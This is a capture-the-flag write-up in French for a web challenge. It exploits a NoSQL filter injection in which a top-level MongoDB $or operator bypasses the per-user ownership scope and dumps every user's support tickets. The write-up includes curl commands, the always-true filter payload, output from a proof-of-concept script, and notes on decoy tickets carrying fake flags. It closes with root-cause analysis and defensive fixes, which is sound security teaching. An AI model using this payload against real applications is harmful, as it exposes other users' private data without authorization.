# TicketVault — injection de filtre NoSQL → broken access control

- **Cible :** `http://<HOST>:<PORT>` (portail de support interne Node.js/Express + MongoDB + express-session)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (voir règle de non-persistance des flags)
- **Fichiers fournis :** `server.js`, `package.json` (les modules `db.js`, `utils/sanitize.js` et `utils/ticketFilter.js` ne sont **pas** inclus — leur comportement a été inféré puis confirmé contre le service en ligne)

## Contexte

Chaque utilisateur s'enregistre, se connecte, crée des tickets (sujet / contenu) et ne
doit voir **que ses propres tickets**. L'indice précise que l'`admin` possède un ticket
contenant le flag et pointe vers la route de récupération des tickets et la logique de
contrôle d'accès.

## Reconnaissance

Dans `server.js`, deux routes se partagent l'affichage des tickets :

```js
app.get('/tickets', requireAuth, async (req, res) => {
  const db = getDb();
  const tickets = await db.collection('tickets')
    .find({ owner: req.session.username }).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: '' });
});

app.get('/tickets/search', requireAuth, async (req, res) => {
  const db = getDb();
  const filter = buildScopedFilter(req);          // utils/ticketFilter.js (non fourni)
  const tickets = await db.collection('tickets').find(filter).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: req.query.q || '' });
});
```

- `/tickets` fige `{ owner: req.session.username }` → route **sûre**.
- `/tickets/search` délègue toute la construction du filtre à `buildScopedFilter(req)`, qui
  est censé forcer `owner == <utilisateur courant>` mais dont le code n'est pas fourni.

La page `/tickets` révèle un champ « Advanced filter (JSON, power users) » lié au paramètre
`filter` :

```html
<form method="GET" action="/tickets/search">
  <input type="text" name="q" placeholder="Search subject...">
  <details>
    <summary>Advanced filter (JSON, power users)</summary>
    <input type="text" name="filter" placeholder='{"subject": "printer"}'>
  </details>
  <button type="submit">Search</button>
</form>
```

Forme classique d'**injection de filtre NoSQL** : le serveur accepte un objet de requête
MongoDB brut, contrôlé par le client, puis tente de le « scoper » à l'utilisateur connecté.

## Vulnérabilité

Comportement déterminé en boîte noire avec deux comptes de test, chacun possédant un ticket
au nom distinctif :

- `filter={"owner":"<autre_user>"}` → **sans effet** : seul le ticket de l'appelant revient.
  Une clé `owner` de premier niveau fournie par l'attaquant est donc écrasée par le scope
  forcé (typiquement `{ ...parsedFilter, owner: session.username }`).
- `filter` contenant un **opérateur MongoDB de premier niveau** (`$or`) → **le scope saute** :

  ```
  GET /tickets/search?filter={"$or":[{"owner":"<autre_user>"},{"owner":"<moi>"}]}
  ```

  renvoie les tickets des **deux** utilisateurs. Dès qu'une clé préfixée `$` apparaît au
  premier niveau, `buildScopedFilter` cesse d'imposer `owner == session.username` comme
  contrainte ET-ée — son « sanitizer » détecte la clé `$` et prend une voie de repli non
  sûre (il court-circuite le scope au lieu de rejeter la requête ou de combiner proprement
  via `$and`).

Conséquence : **tout utilisateur authentifié peut lire l'intégralité de la collection
`tickets`**, admin compris, avec un filtre toujours vrai :

```
GET /tickets/search?filter={"$or":[{"owner":{"$exists":true}}]}
```

IDOR / broken access control de manuel, causé par la confiance accordée à un objet de
requête MongoDB fourni par l'utilisateur sans imposer la contrainte de propriété comme un
ET de premier niveau non contournable.

## Exploitation

1. Enregistrer un compte jetable (`requireAuth` ne vérifie que la présence de
   `req.session.username`, aucun privilège requis).
2. Appeler `/tickets/search` avec un `filter` dont la clause `$or` de premier niveau matche
   tous les documents.
3. Dans la réponse HTML, isoler le ticket dont `owner` vaut exactement `admin`.

```bash
# 1. Enregistrement
curl -s -c ck.txt -X POST http://<HOST>:<PORT>/register \
  -d "username=exploit_user&password=pass123"

# 2. Dump de tous les tickets via le bypass de scope $or
curl -s -G -b ck.txt "http://<HOST>:<PORT>/tickets/search" \
  --data-urlencode 'filter={"$or":[{"owner":{"$exists":true}}]}' \
  -o alltickets.html

# 3. Extraction du ticket de l'admin
grep -i -B2 -A2 'owner: admin<' alltickets.html
```

PoC automatisé (`exploit.py`, exécuté avec `python3 -I`) :

```
$ python3 -I exploit.py http://<HOST>:<PORT>
[+] Registered/logged in as exploit_<rand>
[+] GET /tickets/search?filter={"$or":[{"owner":{"$exists":true}}]}
[!] Ticket de l'admin :
    subject: Root cause analysis - incident 2024-03
    content: Postmortem notes ... Access recovery token: CTF{REDACTED}

[FLAG] CTF{REDACTED}
```

### Piège : tickets leurres

Le dump contient plusieurs tickets « canari » plantés par d'autres participants (owners du
type `admin123`, `adminka`, `falsifier_...`, `audit_t0021_reviewer`) embarquant de faux
flags (p. ex. `CTF{deadbeefcafebabe0123456789abcdef}`,
`CTF{audit_canary_0000_deadbeef}`), certains précisant « should only count if owner is us ».
On les élimine en exigeant que le champ `owner` soit **littéralement** la chaîne `admin` :
un seul ticket satisfait cette condition, et son contenu porte le vrai flag.

## Résultat

Flag récupéré dans le ticket « Root cause analysis - incident 2024-03 » (`owner: admin`).
Valeur réelle **non persistée** ici conformément à la règle de protection des flags :

```
CTF{REDACTED}
```

## Cause racine

`GET /tickets/search` transmet un filtre MongoDB JSON entièrement contrôlé par l'attaquant à
`db.collection('tickets').find(filter)` après une tentative de « scoping » non robuste aux
clés opérateur de premier niveau (`$or`, probablement aussi `$and`, `$nor`…). La contrainte
de propriété peut être supprimée, transformant un « cherche mes tickets » en lecture de
toute la collection.

## Notes de défense

- **Ne jamais passer un objet filtre fourni par l'utilisateur à un driver de base**, même
  « pour power users ». Pour une recherche flexible, n'autoriser que des champs/opérateurs
  en liste blanche (p. ex. `subject: {$regex}`) et construire la requête côté serveur.
- Si un filtre utilisateur doit être fusionné avec le scope, rendre la contrainte de
  propriété **non contournable et non combinable** :

  ```js
  const userFilter = sanitize(parsedFilter); // retire les clés $ de premier niveau
  const scoped = { $and: [{ owner: req.session.username }, userFilter] };
  ```

  et rejeter/dépouiller toute clé préfixée `$` plutôt que de désactiver silencieusement le
  scope quand on en détecte une.
- Ajouter des tests vérifiant que `/tickets/search` ne renvoie jamais de document avec
  `owner != session.username`, y compris avec des charges adverses `$or` / `$where` /
  `$exists`.
